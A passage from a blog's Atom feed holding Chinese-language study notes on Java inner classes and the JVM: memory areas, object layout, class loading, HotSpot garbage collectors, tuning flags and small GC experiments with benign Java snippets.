class="line">   Test3() &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="number">1</span>(a));</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span>$1 <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> <span class="keyword">int</span> val$a;</span><br><span class="line"></span><br><span class="line">   Test3$<span class="number">1</span>(<span class="keyword">int</span> var1) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.val$a = var1;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>虽然lambda反汇编出来跟匿名内部类的代码不太一样，不过我认为也是同样的在同一个线程构造Runnable对象后再传递进去（欢迎指正！）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;实现原理&quot;&gt;&lt;a href=&quot;#实现原理&quot; class=&quot;headerlink&quot; title=&quot;实现原理&quot;&gt;&lt;/a&gt;实现原理&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/j
      
    
    </summary>
    
      <category term="JAVA" scheme="https://h-zex.github.io/categories/JAVA/"/>
    
    
      <category term="java内部类" scheme="https://h-zex.github.io/tags/java%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="java局部类" scheme="https://h-zex.github.io/tags/java%E5%B1%80%E9%83%A8%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>My JVM Note</title>
    <link href="https://h-zex.github.io/2019/03/02/JVM-Note/"/>
    <id>https://h-zex.github.io/2019/03/02/JVM-Note/</id>
    <published>2019-03-02T04:49:04.000Z</published>
    <updated>2019-03-14T12:06:25.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7</p></blockquote><h3 id="Override"><a href="#Override" class="headerlink" title="Override"></a>Override</h3><ul><li>准确式内存管理：即虚拟机可以知道内存中某个位置的数据具体是什么类型</li><li></li></ul><h3 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h3><ul><li><p>方法区</p><ul><li><p>线程共享</p></li><li><p>存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等</p></li><li><p>虚拟机规范把方法区描述为堆的一个逻辑部分（但是有一个别名：Non-Heap）</p></li><li><p>HotSpot用永久代实现。其他虚拟机并没有永久代这个概念</p><blockquote><p>但使用永久代来实现方法区，现在看来并不是一个好主意，因为这样更容易遇到内存溢出问题（永久代有<code>-XX:MaxPermSize</code>的上限，J9和JRockit只要没有触碰到进程可用内存的上限，例如32位系统中的4GB，就不会出现问题），而且有极少数方法（例如<code>String.intern()</code>）会因这个原因导致不同虚拟机下有不同的表现。</p></blockquote></li><li><p>规范要求，可以不需要连续的内存（连续的的物理内存？），可以固定大小或可扩展，可以不实现垃圾收集</p></li><li><p>有OutOfMemoryError异常</p></li></ul></li><li>运行时常量池<ul><li>方法区的一部分</li><li>class文件中的常量池在类加载后就放入这里</li><li>规范没有做细节要求。一般来说,除了保存Class文件中描述的符号引用外,还会把翻译出来的直接引用也存储在运行时常量池中</li><li>具有动态性。运行期可以把新的常量放进池中（比如<code>String.intern()</code>）</li></ul></li><li><p>直接内存</p><ul><li><p>不是虚拟机运行时数据区的一部分，也不是规范中定义的内存区域</p></li><li><p>NIO可以直接操作堆外的内存</p><blockquote><p>在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。</p></blockquote></li><li><p>可能出现OOM异常</p></li><li><p>这里的内存溢出，明显的特征是HeapDum文件中不会看到明显的异常，并且可能Dump文件很小</p></li></ul></li><li>堆<ul><li>存放对象实例</li><li>垃圾收集器管理的主要区域</li><li>线程共享。虚拟机启动时创建</li><li>可以划分出多个线程私有的分配缓冲区</li><li>有OutOfMemoryError异常</li><li>规范要求，可以处于物理上不连续的内存空间，只要逻辑上连续即可。可以是可扩展或固定大小</li></ul></li><li>虚拟机栈<ul><li>线程私有。生命周期与线程相同</li><li>栈帧中有：局部变量表（方法运行期不会改变大小，存有基本数据类型、对象引用、returnAddress类型）、操作数栈、动态链接、方法出口等信息</li><li>方法调用对应于一个栈帧在虚拟机栈的入栈到出栈过程</li><li>有StackOverflowError异常、OutOfMemoryError异常（只有可以动态扩展虚拟机栈的虚拟机再有OOM异常）</li></ul></li><li>本地方法栈<ul><li>类似于虚拟机栈</li><li>线程私有、生命周期与线程相同</li><li>具体的虚拟机可以自由实现</li><li>有StackOverflowError和OutOfMemoryError异常</li><li>在HotSpot虚拟机中并不区分虚拟机栈和本地方法栈</li></ul></li><li>程序计数器<ul><li>线程私有、生命周期与线程相同</li><li>没有任何OutOfMemoryError情况</li></ul></li></ul><h3 id="HotSpot在Java堆中对象的创建、布局、访问"><a href="#HotSpot在Java堆中对象的创建、布局、访问" class="headerlink" title="HotSpot在Java堆中对象的创建、布局、访问"></a><strong>HotSpot</strong>在Java堆中对象的创建、布局、访问</h3><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><blockquote><p>以下仅限于普通对象，不包括数组和class对象</p></blockquote><ul><li>当遇到new指令时<ul><li>在常量池定位这个类的符号引用，并检查该类是否已被加载、解析和初始化过。如果没有要执行对应的加载过程</li><li>为新生对象分配内存（指针碰撞、空闲列表、TLAB）（在类加载后对象所需的内存便可完全确定）</li><li>把分配到的内存空间都初始为0值（如果是TLAB，可以提前到TLAB分配时进行）</li><li>设置对象头（哪个类的实例、如何找到类的元数据信息、对象的hashCode、对象的GC分代年龄等。根据是否启用偏向锁，对象头会有不同的设置方式）</li><li>截止以上，从虚拟机的角度看，新对象已经产生了</li><li>一般来说（由字节码中是否跟随invokespecial指令所决定），执行new指令之后会接着执行<code>&lt;init&gt;</code> 方法， 把对象按照程序员的意愿进行初始化， 这样一个真正可用的对象才算完全产生出来</li></ul></li></ul><h5 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h5><ul><li>对象在内存中的布局有：对象头、实例数据、对齐填充</li><li>对象头<ul><li>第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等</li><li>第二部分是类型指针，即指向类元数据的指针</li><li>如果是数组，还要有一块用于记录长度</li></ul></li><li>实例数据<ul><li>程序代码中所定义的各种类型的字段内容（包括从父类继承和子类中定义的）</li><li>存储顺序会受到虚拟机分配策略参数（FieldsAllocationStyle） 和字段在Java源码中定义顺序的影响</li><li>默认的分配策略是<ul><li>相同宽度字段被分配在一起<ul><li><code>longs/doubles</code></li><li><code>ints</code></li><li><code>shorts/chars</code></li><li><code>bytes/booleans</code></li><li><code>oops</code>(ordinary object pointers)（有个问题，指针不是64bit吗？）</li></ul></li><li>满足上面那个条件后，父类定义的出现在子类之前</li><li>如果CompactFields参数值为true（默认为true），那么子类之中较窄的变量也可能会插入到父类变量的空隙之中</li></ul></li></ul></li><li>padding<ul><li>由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，所以可能需要padding</li></ul></li></ul><h5 id="定位和访问"><a href="#定位和访问" class="headerlink" title="定位和访问"></a>定位和访问</h5><ul><li>HotSpot使用直接指针。另一种方式是句柄（不是HotSpot采用的）</li><li>句柄<ul><li>需要在java堆中有句柄池</li><li>句柄中包含对象的实例数据和类型数据的各自具体地址</li><li>在对象被移动时，无需更新reference数据</li></ul></li></ul><h3 id="类加载的时机"><a href="#类加载的时机" class="headerlink" title="类加载的时机"></a>类加载的时机</h3><blockquote><p>注意，这一部分JVM有明确规定，但不知道是否有一些是实现相关的。我试验时用的是HotSpot，openJDK 1.8，client模式下</p></blockquote><ul><li><p>按照作者说法</p><blockquote><p>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化</p></blockquote><p>在实验中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InitTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Holder.str3);</span><br><span class="line">        <span class="comment">// 如果是输出str，则不会输出`Init Holder`</span></span><br><span class="line">        <span class="comment">// 如果是输出str2和str3则会</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Holder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str = <span class="string">"Hello"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str2 = <span class="keyword">new</span> String(<span class="string">"NewString"</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str3 = String.valueOf(<span class="string">"Str3"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Init Holder"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="HotSpot-VM的结构"><a href="#HotSpot-VM的结构" class="headerlink" title="HotSpot VM的结构"></a>HotSpot VM的结构</h3><ul><li>GC（可插拔）</li><li>JIT（可插拔）</li><li>runtime</li></ul><h3 id="HotSpot-Runtime"><a href="#HotSpot-Runtime" class="headerlink" title="HotSpot Runtime"></a>HotSpot Runtime</h3><h5 id="职责"><a href="#职责" class="headerlink" title="职责"></a>职责</h5><ul><li>parsing of command line arguments</li><li>VM life cycle</li><li>class loading,</li><li>byte code interpreter</li><li>exception handling</li><li>synchronization</li><li>thread management</li><li>Java Native Interface</li><li>VM fatal error handling</li><li>C++ (non-Java) heap management.</li></ul><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><ul><li>程序计数器、虚拟机栈、本地方法栈3个区域需要的内存<strong>基本上</strong>在类结构确定时就已知（JIT优化会有所改变），并且生命周期与线程、方法的进入退出相同，所以内存回收是确定的</li><li>java堆和方法区需要的内存则需要运行时才知道，分配回收都是动态的，所以需要GC</li><li>吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间)</li></ul><h5 id="GC的3件事"><a href="#GC的3件事" class="headerlink" title="GC的3件事"></a>GC的3件事</h5><ul><li>哪些内存需要回收？</li><li>什么时候回收？</li><li>如何回收？</li></ul><h5 id="可作为CG-Roots的对象"><a href="#可作为CG-Roots的对象" class="headerlink" title="可作为CG Roots的对象"></a>可作为CG Roots的对象</h5><ul><li>虚拟机栈（栈帧中的本地变量表） 中引用的对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>本地方法栈中JNI（即一般说的Native方法） 引用的对象</li></ul><h5 id="强、软、弱、虚引用"><a href="#强、软、弱、虚引用" class="headerlink" title="强、软、弱、虚引用"></a>强、软、弱、虚引用</h5><ul><li>强引用：只要还存在，GC永远不会回收被引用对象</li><li>软引用：对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收还没有足够的内存，才会抛出内存溢出异常</li><li>弱引用：被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象</li><li>虚引用：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知</li></ul><h5 id="Hotspot-GC"><a href="#Hotspot-GC" class="headerlink" title="Hotspot GC"></a>Hotspot GC</h5><ul><li><p>Minor GC：新生代的GC，Eden空间的存活对象和from survivor空间的不够老的存活对象复制到to survivor空间，from survivor空间中足够老的对象提升为老年代。结束后，Eden空间一般是全空的（也有不空的情况）。只要追求速度，空间利用率会低一些</p></li><li><p>Major GC（Full GC）：老年代GC, Major GC经常会伴随至少一次的Minor GC（但非绝对的， 在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程） 。 Major GC的速度一般会比Minor GC慢10倍以上</p><blockquote><p><em>java performance</em> HotSpot中译本P57注释有</p><p>“实际上，HotSpot VM的FullGC收集整个堆，包括新生代、老年代、永生代”</p></blockquote></li><li><p>过早提升：Minor GC时，to survivor空间不足，所以多余对象移到老年代</p></li><li><p>提升失败：Minor GC过程中，老年代满了，所以需要Full GC（这需要遍历整个java堆）</p></li><li><p>大对象可能直接分配到老年代</p></li></ul><h6 id="各种GC"><a href="#各种GC" class="headerlink" title="各种GC"></a>各种GC</h6><ul><li><p>Serial</p><ul><li>单线程Stop-The-World式收集器</li><li>新生代使用复制收集算法（如同上面MinorGC那里描述的那样）</li><li>可以与CMS配合</li><li>应用场景<ul><li>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial就很好。</li><li>client模式下新生代的默认收集器（jdk7时？）</li></ul></li></ul></li><li><p>Serial Old</p><ul><li><p>单线程Stop-The-World式收集器</p></li><li><p>Serial的老年代版本</p></li><li><p>使用标记清除压缩收集算法，回收时找出所有的存活对象，然后滑动到堆的头部</p></li><li><p>应用场景</p><ul><li><p>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial Old就很好。</p></li><li><p>主要给Client模式下的虚拟机用</p></li><li><p>在Server模式下,那么它主要还有两大用途</p><ul><li><p>一种用途是在JDK 1.5以及之前的版本中与Parallel Scavenge收集器搭配使用</p><blockquote><p>Parallel Scavenge收集器架构中本身有PS MarkSweep收集器来进行老年代收集,并非直接使用了Serial Old收集器,但是这个PS MarkSweep收集器与Serial Old的实现非常接近,所以在官方的许多资料中都是直接以Serial Old代替PS MarkSweep进行讲解</p></blockquote></li><li><p>另一种用途就是作为CMS收集器的后备预案,在并发收集发生Concurrent Mode Failure时使用</p></li></ul></li></ul></li></ul></li><li><p>ParNew:</p><ul><li>Serial的多线程版本（除了多线程，与Serial差别没有差别）</li><li>新生代的收集器</li><li>可以与CMS配合</li><li>应用场景<ul><li>运行于Server模式下的首选新生代收集器（jdk7时？），因为除了serial，只有它能与CMS配合</li></ul></li></ul></li><li><p>Parallel Scavenge</p><ul><li>又叫吞吐量优先处理器</li><li>新生代的收集器</li><li>多线程Stop-The-World式收集器，采用复制收集算法</li><li>Parallel Scavenge收集器的目标则是达到一个可控制的吞吐量</li><li>不能与CMS配合</li><li>自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别</li><li>Parallel Scavenge收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li><li><code>-XX:MaxGCPauseMillis</code>：参数设置最大垃圾收收集停顿时间。GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的，设得过小可能导致频繁GC</li><li><code>-XX:GCTimeRatio</code>：设置吞吐量，为大于0小于100的整数，设为$x$的含义是GC时间占$\frac{1}{x+1}$，默认是99</li><li><code>-XX:+UseAdaptiveSizePolicy</code>：打开后，就不需要手工指定新生代的大小(-Xmn)、Eden与Survivor区的比例、晋升老年代对象年龄等细节参数了</li></ul></li><li><p>Parallel Old</p><ul><li>Parallel Scavenge收集器的老年代版本</li><li>使用多线程和“标记-整理”算法</li><li>这个收集器是在JDK 1.6中才开始提供的，以前只能让Parallel Scavenge与Serial Old配合</li><li>在注重吞吐量以及CPU资源敏感的场合,都可以优先考虑Parallel Scavenge加Parallel Old收集器</li></ul></li><li><p>CMS(Concurrent Mark Sweep)</p><ul><li><p>老年代的收集器</p></li><li><p>使用多线程、标记-整理算法</p></li><li><p>它第一次实现了让垃圾收集线程与用户线程(基本上)同时工作</p></li><li><p>尽可能并发、低停顿式的收集器，独立于HotSpot分代式GC框架另行实现的并行收集器</p></li><li><p>整个过程分为四个步骤：初始标记、并发标记、重新标记、并发清除</p><blockquote><p>初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象,速度很快,并发标记阶段就是进行GC RootsTracing的过程,而重新标记阶段则是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录,这个阶段的停顿时间一般会比初始标记阶段稍长一些,但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作</p></blockquote></li><li><p>缺点</p><ul><li><p>对CPU资源敏感（默认启动的回收线程是$(\text{CPU数量}+3)/4$）</p></li><li><p>由于在垃圾收集阶段用户线程还需要运行，所以无法处理浮动垃圾，可能出现<code>Concurrent Mode Failure</code>失败而导致另一次FullGC</p><blockquote><p>要是CMS运行期间预留的内存无法满足程序需要,就会出现一次<code>Concurrent Mode Failure</code>失败,这时虚拟机将启动后备预案:临时启用Serial Old收集器来重新进行老年代的垃圾收集,这样停顿时间就很长了</p></blockquote></li><li><p>由于在垃圾收集阶段用户线程还需要运行,那也就还需要预留有足够的内存空间给用户线程使用,因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集,需要预留一部分空间提供并发收集时的程序运作使用（可以通过<code>XX:CMSInitiatingOccupancyFraction</code>调高触发百分比，不过如果过高，就会出现<code>Concurrent Mode Failure</code>）</p></li><li><p>基于标记-清除算法，所以会有大量空间碎片，导致可能提前触发FullGC</p><blockquote><ul><li>为了解决这个问题,CMS收集器提供了一个<code>XX:+UseCMSCompactAtFullCollection</code>开关参数(默认就是开启的),用于在CMS收集器顶不住要进行FullGC时开启内存碎片的合并整理过程,内存整理的过程是无法并发的,空间碎片问题没有了,但停顿时间不得不变长</li><li>虚拟机设计者还提供了另外一个参数<code>-XX:CMSFullGCsBeforeCompaction</code>,这个参数是用于设置执行多少次不压缩的Full GC后,跟着来一次带压缩的(默认值为0,表示每次进入Full GC时都进行碎片整理)。</li></ul></blockquote></li></ul></li></ul></li><li><p>G1</p><ul><li>G1收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li><li>面向服务端</li></ul></li></ul><h3 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h3><ul><li>例子 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ClassLoader myLoader = <span class="keyword">new</span> ClassLoader() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String fileName = name.substring(name.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>) + <span class="string">".class"</span>;</span><br><span class="line">            InputStream is = getClass().getResourceAsStream(fileName);</span><br><span class="line">            <span class="keyword">if</span> (is == <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"use super loader"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[is.available()];</span><br><span class="line">            is.read(b);</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><blockquote><p>以下可能有HotSpot专有的参数</p></blockquote><ul><li><p><code>-Xms</code>： the initial memory sizes available to the JVM</p></li><li><p><code>-Xmx</code>： the maximum memory sizes available to the JVM</p></li><li><p><code>-Xms</code>, <code>-Xmx</code>：用于JVM heap。Increasing the amount of memory available can improve performance, but increasing it to too high a value can have a detrimental effect in the form of longer pauses for full garbage collection runs. Therefore, the initial and maximum sizes should be set to the same value.</p></li><li><p><code>-Xmn</code>：新生代大小</p></li><li><p><code>-XX:SurvivorRatio</code>：Eden与Survivor区的比例</p></li><li><p><code>-XX:PretenureSizeThreshold</code>：晋升老年代对象的年龄</p></li><li><p><code>-Xss</code>：栈容量</p></li><li><p><code>-Xoss</code>：本地方法栈大小（因为HotSpot不区分虚拟机栈和本地方法栈，所以该参数无效）</p></li><li><p><code>-XX:MaxDirectMemorySize</code>：本地直接内存的最大容量。默认与java堆最大值一样</p></li><li><p><code>-Xnoclassgc</code>：是否对类进行回收（HotSpot VM）</p></li><li><p><code>-verbose:class</code>, <code>-XX:+TraceClassLoading</code>, <code>-XX:+TraceClassUnLoading</code>：查看类加载卸载信息。第三个需要FastDebug版虚拟机支持</p></li><li><p><code>-XX:+/-UseTLAB</code>：是否启用本地线程分配缓存</p></li><li><p><code>Xlog:gc*</code>, <code>-XX:+PrintGCDetails</code>：打印GC日志</p></li><li><p><code>-XX:MaxTenuringThreshold</code>：晋升老年代的年龄阀值</p></li><li><p><code>-XX:+PrintReferenceGC</code>：GC时打印finalReference的信息</p></li><li><p><code>-XX:+PrintGCApplicationStoppedTime</code>：打印到达安全点的信息</p></li><li><p><code>-XX:UseCompressedOops</code>：开启压缩指针</p></li><li><p><code>-XX:PretenureSizeThreshold</code>：大于这个设置值的对象直接在老年代分配。这样做的目的是避免在Eden区及两个Survivor区之间发生大量的内存复制（因为新生代采用复制算法收集内存）</p><blockquote><p>PretenureSizeThreshold参数只对Serial和ParNew两款收集器有效， Parallel Scavenge收集器不认识这个参数， Parallel Scavenge收集器一般并不需要设置。 如果遇到必须使用此参数的场合，可以考虑ParNew加CMS的收集器组合。</p></blockquote></li></ul><h3 id="实验和调优"><a href="#实验和调优" class="headerlink" title="实验和调优"></a>实验和调优</h3><h5 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h5><ul><li>HotSpot，单线程下怎样测试都只抛出<code>StackOverflowError</code>，所以<code>StackOverflowError</code>应该不是因为调用深度超过某个值就抛出，而是内存不足导致抛出（所以相应减小栈上变量的总大小，可以提高栈深度）</li><li>如果是建立过多线程导致的内存溢出，在不能减少线程数或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程</li></ul><h5 id="GC-1"><a href="#GC-1" class="headerlink" title="GC"></a>GC</h5><ul><li>大对象对GC不友好，经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。写程序时应当避免“短命大对象”。</li></ul><h5 id="局部变量表的slot复用与GC"><a href="#局部变量表的slot复用与GC" class="headerlink" title="局部变量表的slot复用与GC"></a>局部变量表的slot复用与GC</h5><ul><li><p>代码1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder没有被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder没有被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><blockquote><p>如果遇到一个方法，其后面的代码有一些耗时很长的操作，而前面又定义了占用了大量内存、实际上已经不会再使用的变量，手动将其设置为null值（用来代替那句<code>int a=0</code>，把变量对应的局部变量表Slot清空）便不见得是一个绝对无意义的操作，这种操作可以作为一种在极特殊情形（对象占用内存大、此方法的栈帧长时间不能被回收、方法调用次数达不到JIT的编译条件）下的“奇技”来使用。</p></blockquote></li><li><blockquote><p>从编码角度讲， 以恰当的变量作用域来控制变量回收时间才是最优雅的解决方法， 如代码清单8-3那样的场景并不多见。 更关键的是， 从执行角度讲， 使用赋null值的操作来优化内存回收是建立在对字节码执行引擎概念模型的理解之上的，但是实际执行中，与概念模型差别很大，所以赋null可能无必要（然而我自己使用java11，上面那个测试代码，G1，似乎没有<code>int a=0</code>就没有回收）</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Override&quot;&gt;&lt;a href=&quot;#Override&quot; class=&quot;headerlink&quot; title=&quot;Ove
      
    
    </summary>
    
      <category term="JVM" scheme="https://h-zex.github.io/categories/JVM/"/>
    
    
  </entry>
  
  <entry>
    <title>My Java Concurrent Note</title>
